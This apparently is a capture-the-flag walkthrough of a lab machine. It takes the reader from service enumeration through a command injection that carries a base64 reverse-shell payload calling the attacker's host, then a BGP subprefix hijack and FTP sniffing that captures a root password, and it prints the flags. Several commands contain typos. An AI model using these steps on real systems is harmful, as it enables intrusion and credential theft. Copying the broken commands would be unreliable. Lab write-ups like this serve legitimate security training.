###  Carrier

#### information

21/tcp filtered ftp
22/tcp open     ssh  <span style=color:red>   OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span>
| ssh-hostkey:
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be​:​de:​07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open  <span style=color:red>   http    Apache httpd 2.4.18 ((Ubuntu))</span>
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

the [launchpad]( https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4)   tell you  the os is  [Bionic]()    where the openssh is, but  apache is not same, [Xenial]()

It is wired! so let's try Enum the [apache]().

****

 gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.105

/img (Status: 301)
/tools (Status: 301)
/doc (Status: 301)
Progress: 464 / 220561 (0.21%)^C
[!] Keyboard interrupt detected, terminating.

*****

web site have /doc directory , try   http://10.10.10.105/  it tell us  Error 45007 and 45009, It means that "License invalid or expired"  and "Default admin user password is set (see chassis serial number)"  in doc , it make me have tips!

so let try enum the udp port ! 

*****

 nmap -sU -p- --max-retries 0 10.11.1.105 --open -Pn

Not shown: 65179 open|filtered ports, 355 closed ports
PORT    STATE SERVICE
161/udp open  snmp

*****

the is port 161 , so that is [snmp]() port, so  try enum snmp with public community.

*****

 snmpwalk -v2c -c public 10.10.10.105

iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
iso.3.6.1.2.1.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)

*****

login with the  [sn]()

another tips in http://10.10.10.105/tickets.php

'''

Rx / CastCom. IP Engineering team from one of our upstream ISP called to
report a problem with some of their routes being leaked again due to a 
misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net 
Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom.
still reporting issues with 3 networks: 
10.120.15,10.120.16,10.120.17/24's, one of their VIP is having issues 
connecting by FTP to an important server in the 10.120.15.0/24 network, 
investigating... Updated 2018/06/16: No prbl. found, suspect they had 
stuck routes after the leak and cleared them manually.

#### GET SHELL

'''

and the http://10.10.10.105/diag.php  , it means somebody use [ps]()   command to do this. 

it  is very amazing that we can  post with the base64 encode  command.

POST /diag.php HTTP/1.1
Host: 10.10.10.105
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.105/diag.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Cookie: PHPSESSID=tohdslhr9mcvtrpemtpjj15727
Connection: close
Upgrade-Insecure-Requests: 1

check=cXVhZ2dhO2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjcvOTAwMCAwPiYx

and we get the [shell]()

as we mention  before that  hava another tips in http://10.10.10.105/tickets.php

and we get the use is root, see the [/proc/1/environ], this is a lxc container

```shell
cat /proc/1/environ
container=lxcroot
```

use the script [LinEnum.sh]()  to enum the  system  this a cron job in 

*/10 * * * * /opt/restore.sh 

this is interesting, but  we  firstly find out  what is the [ftp] ip. in the 10.120.15.0/24 network

by ** for i in  $(seq 1 255); do ping -c 10.120.15.$1 | grep ttl ; done 

64 bytes from 10.120.15.1: icmp_seq=1 ttl=64 time=0.092 ms
64 bytes from 10.120.15.10: icmp_seq=1 ttl=63 time=0.060 ms

echo a > /dev/tcp/10.120.15.10/21 && echo on

by the way, we can use the static-nmap https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap  .

so we know the ftp on 10.120.15.10, but login with anonymous  will fail.

we use the [LinEnum.sh]()  to enum the system, we found that there is the cron job

*/10 * * * * /opt/restore.sh

#### BGP HIjacking

so we try to  use the vtysh login in the [quagga]()  version.

show run

```shell
show run
Building configuration...

Current configuration:
!
!
interface eth0
 ipv6 nd suppress-ra
 no link-detect
!
interface eth1
 ipv6 nd suppress-ra
 no link-detect
!
interface eth2
 ipv6 nd suppress-ra
 no link-detect
!
interface lo
 no link-detect
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.10.2 route-map to-as200 out
--More--

 neighbor 10.78.11.2 remote-as 300
--More--

 neighbor 10.78.11.2 route-map to-as300 out
!
route-map to-as200 permit 10
--More--
!
route-map to-as300 permit 10
!
ip forwarding
!
line vty
```

####   inject the network  10.120.15.0/24

 somebody in  as-200  login into 10.120.15.10/24 where at  as-300, but  I we are in  the [as-100]()

. about  the bgp hijack [bgp hijack example](http://cs.slu.edu/~espositof/teaching/4650/lab3/),   <span style=color:red>so let us make it clear !!</span>

1.  generate new network  10.120.15.0/25 in as -100 , Subprefix Hijacking. tell the as-200 turn the flow  (as-200 ->as-300)into  as-100.
2. don't send the new network 10.120.15.0/15 to as-300, make  as-300 send the data like before(as-300>as-200)
3. tell the as-200  that don't send the new network to as-300.

so the data is like that(<span style=color:red>sombody->as200->as-100>as-300->10.120.15.10->as-300->as-200->somebody</span>)

Let's go!

**new network**

```shell
r1# config t
config t
r1(config)# router bgp 100
router bgp 100
r1(config-router)# network 10.120.15.0/25
network 10.120.15.0/25
```

**advertise-router**

```powershell
show ip bgp nei 10.78.10.2 adv
BGP table version is 0, local router ID is 10.255.255.1
Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
              i internal, r RIB-failure, S Stale, R Removed
Origin codes: i - IGP, e - EGP, ? - incomplete

   Network          Next Hop            Metric LocPrf Weight Path
*> 10.78.10.0/24    10.78.10.1               0         32768 ?
*> 10.78.11.0/24    10.78.10.1               0         32768 ?
*> 10.99.64.0/24    10.78.10.1               0         32768 ?
*> 10.101.8.0/21    10.78.10.1               0         32768 i
*> 10.101.16.0/21   10.78.10.1               0         32768 i
*> 10.120.10.0/24   10.78.10.1                             0 300 i
*> 10.120.11.0/24   10.78.10.1                             0 300 i
*> 10.120.12.0/24   10.78.10.1                             0 300 i
*> 10.120.13.0/24   10.78.10.1                             0 300 i
*> 10.120.14.0/24   10.78.10.1                             0 300 i
*> 10.120.15.0/24   10.78.10.1                             0 300 i
*> 10.120.15.0/25   10.78.10.1               0         32768 i

r1# show ip bgp nei 10.78.11.2 advertised-routes
show ip bgp nei 10.78.11.2 advertised-routes
BGP table version is 0, local router ID is 10.255.255.1
Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
              i internal, r RIB-failure, S Stale, R Removed
Origin codes: i - IGP, e - EGP, ? - incomplete

   Network          Next Hop            Metric LocPrf Weight Path

*> 10.101.8.0/21    10.78.11.1               0         32768 i
*> 10.101.16.0/21   10.78.11.1               0         32768 i
*> 10.120.15.0/25   10.78.11.1               0         32768 i
```

**don't tell the as-300**

```shell
r1(config)# ip prefix-list fi-25 permit 10.120.15.0/25
ip prefix-list fi-25 permit 10.120.15.0/25
r1(config)# route-map to-as300 deny  5
route-map to-as 300 deny  5
r1(config-route-map)# match ip address prefix-list fi-25
match ip address prefix-list fi-25
```

**tell  the as-200  don't tell to as-300**

```shell
r1(config)# route-map to-as200 permit 20
route-map to-as200 permit 20
r1(config-route-map)# match ip address prefix-list fi-25
match ip address prefix-list fi-25
r1(config-route-map)# ?

  call         Jump to another Route-Map after match+set
  continue     Continue on a different entry within the route-map
  description  Route-map comment
  end          End current mode and change to enable mode
  exit         Exit current mode and down to previous mode
  list         Print command list
  match        Match values from routing table
  no           Negate a command or set its defaults
  on-match     Exit policy on matches
  quit         Exit current mode and down to previous mode
  set          Set value
r1(config-route-map)#
r1(config-route-map)# set community no-export
set community no-export
```

**refresh the route**

```shell
r1# sh  ip bgp nei 10.78.11.2 adv
BGP table version is 0, local router ID is 10.255.255.1
Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
              i internal, r RIB-failure, S Stale, R Removed
Origin codes: i - IGP, e - EGP, ? - incomplete

   Network          Next Hop            Metric LocPrf Weight Path
*> 10.78.10.0/24    10.78.11.1               0         32768 ?
*> 10.78.11.0/24    10.78.11.1               0         32768 ?
*> 10.99.64.0/24    10.78.11.1               0         32768 ?
*> 10.100.10.0/24   10.78.11.1                             0 200 i
*> 10.100.11.0/24   10.78.11.1                             0 200 i
*> 10.100.12.0/24   10.78.11.1                             0 200 i
*> 10.100.13.0/24   10.78.11.1                             0 200 i
*> 10.100.14.0/24   10.78.11.1                             0 200 i
*> 10.100.15.0/24   10.78.11.1                             0 200 i
*> 10.100.16.0/24   10.78.11.1                             0 200 i
*> 10.100.17.0/24   10.78.11.1                             0 200 i
*> 10.100.18.0/24   10.78.11.1                             0 200 i
*> 10.100.19.0/24   10.78.11.1                             0 200 i
*> 10.100.20.0/24   10.78.11.1                             0 200 i
*> 10.101.8.0/21    10.78.11.1               0         32768 i
*> 10.101.16.0/21   10.78.11.1               0         32768 i


Total number of prefixes 5

r1# show ip bgp nei 10.78.10.2 adv
BGP table version is 0, local router ID is 10.255.255.1
Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
              i internal, r RIB-failure, S Stale, R Removed
Origin codes: i - IGP, e - EGP, ? - incomplete

   Network          Next Hop            Metric LocPrf Weight Path
*> 10.78.10.0/24    10.78.10.1               0         32768 ?
*> 10.78.11.0/24    10.78.10.1               0         32768 ?
*> 10.99.64.0/24    10.78.10.1               0         32768 ?
*> 10.101.8.0/21    10.78.10.1               0         32768 i
*> 10.101.16.0/21   10.78.10.1               0         32768 i
*> 10.120.10.0/24   10.78.10.1                             0 300 i
*> 10.120.11.0/24   10.78.10.1                             0 300 i
*> 10.120.12.0/24   10.78.10.1                             0 300 i
*> 10.120.13.0/24   10.78.10.1                             0 300 i
*> 10.120.14.0/24   10.78.10.1                             0 300 i
*> 10.120.15.0/24   10.78.10.1                             0 300 i
*> 10.120.15.0/25   10.78.10.1               0         32768 i
*> 10.120.16.0/24   10.78.10.1                             0 300 i
*> 10.120.17.0/24   10.78.10.1                             0 300 i
*> 10.120.18.0/24   10.78.10.1                             0 300 i
*> 10.120.19.0/24   10.78.10.1                             0 300 i
*> 10.120.20.0/24   10.78.10.1                             0 300 i
```

**Summary**  remember 5<10

```shell
ip prefix-list fi-25 seq 5 permit 10.120.15.0/25
!
route-map to-as300 deny 5
 match ip address prefix-list fi-25
!
route-map to-as300 deny 20
 match ip address prefix-list fi-25
!
route-map to-as200 permit 5
 match ip address prefix-list fi-25
 set community no-export
!
route-map to-as200 permit 20
!
route-map to-as200 permit 10
!
route-map to-as300 permit 10

```

```shell
r1# ping 10.120.15.10
PING 10.120.15.10 (10.120.15.10) 56(84) bytes of data.
64 bytes from 10.120.15.10: icmp_seq=1 ttl=63 time=0.075 ms
```

<span style=color:red>ping 10.120.15.10 </span>

**sniff the  ftp flow**

```shell
r1# exit
root@r1:~# nohup tcpdump -i any -w ftp3.cap  port 21 &
[1] 13183
root@r1:~# nohup: ignoring input and appending output to 'nohup.out'

root@r1:~# ls -al ftp3*
-rw-r--r-- 1 root root 0 Mar 18 15:09 ftp3.cap
root@r1:~# ls -al ftp3*
-rw-r--r-- 1 root root 8192 Mar 18 15:11 ftp3.cap
```

**wireshark -r ftp3.cap**

```bash
220 (vsFTPd 3.0.3)

USER root

331 Please specify the password.

PASS BGPtelc0rout1ng

230 Login successful.

SYST

215 UNIX Type: L8

TYPE I

200 Switching to Binary mode.

PASV

227 Entering Passive Mode (10,120,15,10,255,8).

STOR secretdata.txt

150 Ok to send data.

226 Transfer complete.

QUIT

221 Goodbye.
```

 **ssh root@10.10.10.105**

paswd :  BGPtelc0rout1ng

root@carrier:~# cat root*
2832e552061532250ac2a21478fd4866
root@carrier:~# cat secretdata.txt
56484a766247786c5a43456849513d3d



Boom!

